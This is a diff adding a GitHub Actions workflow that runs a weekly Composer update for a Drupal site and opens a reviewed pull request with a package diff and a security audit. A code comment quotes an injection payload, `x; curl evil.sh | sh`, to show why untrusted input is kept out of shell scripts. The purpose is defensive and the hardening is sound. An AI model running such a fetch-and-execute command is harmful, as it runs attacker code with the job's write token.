@@ -1,0 +1,149 @@
+###############################################################################
+# Weekly dependency update, as a pull request.
+#
+# The previous version ran `composer update` and pushed the new lock file
+# straight to main, then deployed it. That is the wrong shape for this change
+# class: a Drupal composer update routinely moves core and thirty contrib
+# modules at once, any of which can carry a schema update or a breaking API
+# change, and pushing it unreviewed means the first person to find out is
+# whoever loads the site.
+#
+# This opens a PR instead, with a package-by-package diff and a security audit in
+# the body, gated on pull-request.yml. Merging it triggers the normal deploy.
+###############################################################################
+
+name: Composer update
+
+on:
+  schedule:
+    # Monday 02:00 UTC. Early in the week on purpose: a dependency update that
+# needs attention should land when there are working days left to give it.
+    - cron: '0 2 * * 1'
+  workflow_dispatch:
+    inputs:
+      packages:
+        description: "Space-separated packages to update. Empty updates everything within the constraints in composer.json."
+        type: string
+        required: false
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  update:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup PHP
+        uses: shivammathur/setup-php@v2
+        with:
+          # Must match the PHP_VERSION arg in the Dockerfile. Resolving
+          # dependencies on a different PHP than production runs produces a lock
+          # file that satisfies constraints the runtime does not meet.
+          php-version: '8.3'
+          tools: composer:v2
+          extensions: gd, pdo_mysql, zip, intl, opcache, apcu
+
+      - name: Composer update
+        env:
+          COMPOSER_AUTH: '{"github-oauth":{"github.com":"${{ secrets.GITHUB_TOKEN }}"}}'
+          # Via the environment, never interpolated into the script. A
+          # workflow_dispatch input is attacker-controlled text as far as this
+          # runner is concerned, and `${{ ... }}` is substituted before the shell
+          # sees it — so `x; curl evil.sh | sh` would run with this job's write
+          # token.
+          INPUT_PACKAGES: ${{ github.event.inputs.packages }}
+        run: |
+          set -euo pipefail
+          if [ -n "$INPUT_PACKAGES" ]; then
+            # Package names only: vendor/name, optionally with a version
+            # constraint. Anything else is a mistake regardless of intent.
+            case "$INPUT_PACKAGES" in
+              *[!a-zA-Z0-9./_:^~*\ -]*)
+                echo "::error::packages may contain only package names and constraints."
+                exit 1 ;;
+            esac
+            # Deliberately unquoted, so a space-separated list becomes several
+            # arguments — which is why the character check above matters.
+            # shellcheck disable=SC2086
+            #
+            # Note the absence of --with-all-dependencies: adding it pulls in
+            # unrelated transitive bumps and makes a targeted security fix
+            # unreviewable.
+            ./scripts/composer-retry.sh update $INPUT_PACKAGES --no-interaction --no-progress
+          else
+            ./scripts/composer-retry.sh update --no-interaction --no-progress
+          fi
+
+      - name: Compose the pull request body
+        run: |
+          set -euo pipefail
+          {
+            echo "Automated dependency update."
+            echo
+          } > pr-body.md
+
+          # Diff the lock file package-by-package. `git diff composer.lock` is
+          # thousands of lines of hashes; this is the part a reviewer can act on.
+          php -r '
+            $old = json_decode(shell_exec("git show HEAD:composer.lock"), true);
+            $new = json_decode(file_get_contents("composer.lock"), true);
+            $flat = function (?array $lock): array {
+              $out = [];
+              foreach (array_merge($lock["packages"] ?? [], $lock["packages-dev"] ?? []) as $p) {
+                $out[$p["name"]] = $p["version"];
+              }
+              return $out;
+            };
+            $before = $flat($old);
+            $after = $flat($new);
+            $rows = [];
+            foreach ($after as $name => $version) {
+              $was = $before[$name] ?? "(new)";
+              if ($was !== $version) { $rows[] = "| `$name` | $was | $version |"; }
+            }
+            foreach ($before as $name => $version) {
+              if (!isset($after[$name])) { $rows[] = "| `$name` | $version | (removed) |"; }
+            }
+            if ($rows) {
+              echo "### Package changes\n\n| Package | From | To |\n| --- | --- | --- |\n";
+              echo implode("\n", $rows), "\n\n";
+            } else {
+              echo "No package version changes.\n\n";
+            }
+          ' >> pr-body.md
+
+          {
+            echo "### Security audit of the new lock file"
+            echo '```'
+            # --locked audits composer.lock directly, so no install is needed.
+            # Abandoned packages are reported but do not fail: abandonment is a
+            # maintenance note, not a vulnerability.
+            composer audit --no-interaction --abandoned=report --locked 2>&1 || true
+            echo '```'
+          } >> pr-body.md
+          cat pr-body.md
+
+      - name: Open pull request
+        id: pr
+        uses: peter-evans/create-pull-request@v6
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+          commit-message: "chore(deps): update composer dependencies"
+          title: "Composer dependency update"
+          body-path: pr-body.md
+          branch: automated/composer-update
+          delete-branch: true
+          labels: dependencies
+
+      - name: Summary
+        if: steps.pr.outputs.pull-request-number != ''
+        env:
+          # Via the environment rather than interpolated into the script: an
+          # expression substituted directly into a run: block is untrusted text
+          # in a shell context, and a PR title or branch name containing a quote
+          # or a backtick would be executed.
+          PR_NUMBER: ${{ steps.pr.outputs.pull-request-number }}
+        run: echo "Opened PR number ${PR_NUMBER}" >> "$GITHUB_STEP_SUMMARY"
